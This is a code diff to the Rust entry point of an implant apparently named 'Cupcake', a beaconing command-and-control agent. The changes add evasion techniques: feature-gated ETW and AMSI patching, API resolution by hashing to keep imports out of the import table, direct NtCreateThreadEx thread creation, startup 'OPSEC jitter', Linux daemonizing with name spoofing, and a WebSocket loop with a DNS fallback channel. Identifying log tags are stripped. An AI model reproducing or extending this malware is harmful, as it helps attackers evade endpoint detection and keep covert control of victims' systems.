@@ -14,15 +14,12 @@
 
 #![cfg_attr(target_os = "windows", windows_subsystem = "windows")]
  
-  #[allow(unused_imports)]
-  use cupcake_core::{Result, stealth};
-  #[allow(unused_imports)]
-  use log::info;
+#[allow(unused_imports)]
+use cupcake_core::{Result, stealth};
+#[allow(unused_imports)]
+use log::info;
 
-  #[cfg(target_os = "windows")]
-  use winapi::um::{combaseapi::CoInitializeEx, objbase::COINIT_MULTITHREADED};
- 
- #[cfg(target_os = "linux")]
+#[cfg(target_os = "linux")]
 fn daemonize() {
     unsafe {
         // 第一阶段 fork：创建子进程
@@ -65,8 +62,11 @@ fn main() {
         #[cfg(target_os = "windows")]
         stealth::setup_diagnostic_console();
 
-        // 🚀 Initialize env_logger to capture log::* output
-        env_logger::Builder::from_env(env_logger::Env::default().default_filter_or("info")).init();
+        // Initialize env_logger only when the `logging` feature is compiled in.
+        #[cfg(feature = "logging")]
+        {
+            env_logger::Builder::from_env(env_logger::Env::default().default_filter_or("info")).init();
+        }
     }
 
     // 💥 Global Panic Hook
@@ -88,17 +88,42 @@ fn main() {
         log::info!("Stealth: hide_console() skipped due to active logging");
     }
 
-    // 4. [Anti-Analysis] Patch ETW and AMSI BEFORE any COM/API calls
-    #[cfg(target_os = "windows")]
+    // 4. Optional ETW/AMSI patches — only when built with `stealth-adv`.
+    // Default builds skip this to reduce static/behavioral signatures and avoid
+    // force-loading amsi.dll on processes that never needed it.
+    #[cfg(all(target_os = "windows", feature = "stealth-adv"))]
     {
         stealth::patch_etw();
         stealth::patch_amsi();
     }
 
-    // 5. COM Initialization for PTY support (AFTER ETW patch to suppress telemetry)
+    // 5. COM Initialization for PTY support (dynamic resolve — no combase IAT)
     #[cfg(target_os = "windows")]
     unsafe {
-        CoInitializeEx(std::ptr::null_mut(), COINIT_MULTITHREADED);
+        // COINIT_MULTITHREADED = 0x0
+        type CoInitializeExFn =
+            unsafe extern "system" fn(*mut winapi::ctypes::c_void, u32) -> i32;
+        let mut done = false;
+        for dll in [b"combase.dll".as_slice(), b"ole32.dll".as_slice()] {
+            let base = cupcake_core::stealth::get_module_base(
+                cupcake_core::stealth::hash_module_name(dll),
+            );
+            if base == 0 {
+                continue;
+            }
+            if let Some(addr) = cupcake_core::stealth::get_api_addr(
+                base,
+                cupcake_core::stealth::hash_api_name(b"CoInitializeEx"),
+            ) {
+                let f: CoInitializeExFn = std::mem::transmute(addr);
+                let _ = f(std::ptr::null_mut(), 0);
+                done = true;
+                break;
+            }
+        }
+        if !done {
+            cupcake_core::utils::db_print("[WARN] CoInitializeEx not resolved");
+        }
     }
 
     // 9. Backgrounding and Name Spoofing (Linux)
@@ -113,57 +138,89 @@ fn main() {
     #[cfg(target_os = "windows")]
     {
         unsafe extern "system" fn agent_thread_proc(_: *mut winapi::ctypes::c_void) -> u32 {
-            let rt = match tokio::runtime::Runtime::new() {
-                    Ok(r) => r,
-                    Err(e) => {
-                        cupcake_core::utils::db_print(&format!("[FATAL] Failed to create tokio runtime: {}", e));
-                        return 1;
-                    }
-                };
+            let rt = match build_runtime() {
+                Ok(r) => r,
+                Err(e) => {
+                    cupcake_core::utils::db_print(&format!("[FATAL] Failed to create tokio runtime: {}", e));
+                    return 1;
+                }
+            };
 
             rt.block_on(async {
                 if let Err(e) = run().await {
                     cupcake_core::utils::db_print(&format!("[FATAL] Agent run loop failed: {:?}", e));
                 }
             });
-            
+
             0
         }
         
-        unsafe {
-            let h_thread = winapi::um::processthreadsapi::CreateThread(
-                std::ptr::null_mut(),  // lpThreadAttributes
-                8 * 1024 * 1024,       // dwStackSize: 8MB
-                Some(agent_thread_proc),
-                std::ptr::null_mut(),  // lpParameter
-                0,                     // dwCreationFlags: run immediately
-                std::ptr::null_mut(),  // lpThreadId
-            );
-            
-            if h_thread.is_null() {
+        // Prefer NtCreateThreadEx (syscall); no CreateThread IAT dependency.
+        let h_thread = match cupcake_core::native::create_thread_ex(
+            agent_thread_proc,
+            std::ptr::null_mut(),
+            8 * 1024 * 1024, // 8MB commit stack
+        ) {
+            Ok(h) => h,
+            Err(e) => {
+                cupcake_core::utils::db_print(&format!(
+                    "[FATAL] NtCreateThreadEx failed: {}",
+                    e
+                ));
                 return;
             }
-            
-            // Wait indefinitely for our agent thread to finish
-            winapi::um::synchapi::WaitForSingleObject(h_thread, winapi::um::winbase::INFINITE);
-            winapi::um::handleapi::CloseHandle(h_thread);
-        }
+        };
+
+        // Wait indefinitely for agent thread
+        cupcake_core::native::wait_for_single_object(h_thread);
+        let _ = cupcake_core::native::close_handle(h_thread);
     }
     #[cfg(not(target_os = "windows"))]
     {
-        let rt = tokio::runtime::Runtime::new().expect("Failed to create tokio runtime");
+        let rt = match build_runtime() {
+            Ok(r) => r,
+            Err(_) => return,
+        };
         rt.block_on(async {
             let _ = run().await;
         });
     }
 }
 
+/// Build Tokio runtime: multi-thread when `rt-multi` feature is on, else current-thread (smaller).
+fn build_runtime() -> std::result::Result<tokio::runtime::Runtime, std::io::Error> {
+    #[cfg(feature = "rt-multi")]
+    {
+        tokio::runtime::Builder::new_multi_thread()
+            .enable_all()
+            .build()
+    }
+    #[cfg(not(feature = "rt-multi"))]
+    {
+        tokio::runtime::Builder::new_current_thread()
+            .enable_all()
+            .build()
+    }
+}
+
 /// 主运行逻辑
 async fn run() -> Result<()> {
-    // 💤 1. Sleep Delay
-    let sleep_secs = cupcake_core::config::get_sleep_time();
-    if sleep_secs > 0 {
-        tokio::time::sleep(tokio::time::Duration::from_secs(sleep_secs)).await;
+    // 💤 1. Sleep Delay (+ Stage0 OPSEC jitter when beacon profile)
+    #[cfg(all(feature = "module-loader", not(feature = "post-ex")))]
+    {
+        let delay_ms = cupcake_core::module_loader::stage0_startup_delay_ms();
+        cupcake_core::utils::db_print(&format!(
+            "[Cupcake] Stage0 startup delay {} ms (OPSEC jitter)",
+            delay_ms
+        ));
+        crate::stealth::stealth_sleep(delay_ms as u32).await;
+    }
+    #[cfg(not(all(feature = "module-loader", not(feature = "post-ex"))))]
+    {
+        let sleep_secs = cupcake_core::config::get_sleep_time();
+        if sleep_secs > 0 {
+            tokio::time::sleep(tokio::time::Duration::from_secs(sleep_secs)).await;
+        }
     }
 
     // 🆔 预计算并缓存 Agent UUID
@@ -244,7 +301,7 @@ async fn run_websocket_mode() -> Result<()> {
             FallbackState::WaitingRecovery => {
                 // Wait before recovery attempt
                 let recovery_delay = fallback.recovery_delay_secs();
-                log::info!("[Cupcake] Waiting {}s before recovery attempt", recovery_delay);
+                log::info!("Waiting {}s before recovery attempt", recovery_delay);
                 tokio::time::sleep(tokio::time::Duration::from_secs(recovery_delay)).await;
 
                 if let Some(primary_url) = fallback.attempt_recovery() {
@@ -270,7 +327,7 @@ async fn run_websocket_mode() -> Result<()> {
                 if let Some(_fallback_url) = fallback.switch_to_fallback() {
                     #[cfg(feature = "dns")]
                     {
-                        log::info!("[Cupcake] Switching to DNS backup channel");
+                        log::info!("Switching to DNS backup channel");
                         match create_transport(&fallback_url) {
                             Ok(t) => {
                                 transport = t;
@@ -278,7 +335,7 @@ async fn run_websocket_mode() -> Result<()> {
                                 continue;
                             }
                             Err(_) => {
-                                log::warn!("[Cupcake] Fallback channel also failed");
+                                log::warn!("Fallback channel also failed");
                             }
                         }
                     }
@@ -298,8 +355,18 @@ async fn run_websocket_mode() -> Result<()> {
         // 连接成功：重置退避计时器
         backoff.reset();
 
-        let handler = cupcake_core::BatchMessageHandler::new(transport, None);
-        match handler.run().await {
+        #[cfg(feature = "plugin")]
+        let run_result = {
+            let handler = cupcake_core::BatchMessageHandler::new(transport, None);
+            handler.run().await
+        };
+        #[cfg(not(feature = "plugin"))]
+        let run_result = {
+            let handler = cupcake_core::MessageHandler::new(transport);
+            handler.run().await
+        };
+
+        match run_result {
             Ok(returned_transport) => {
                 transport = returned_transport;
                 // Connection dropped but recovered - mark primary as recovered
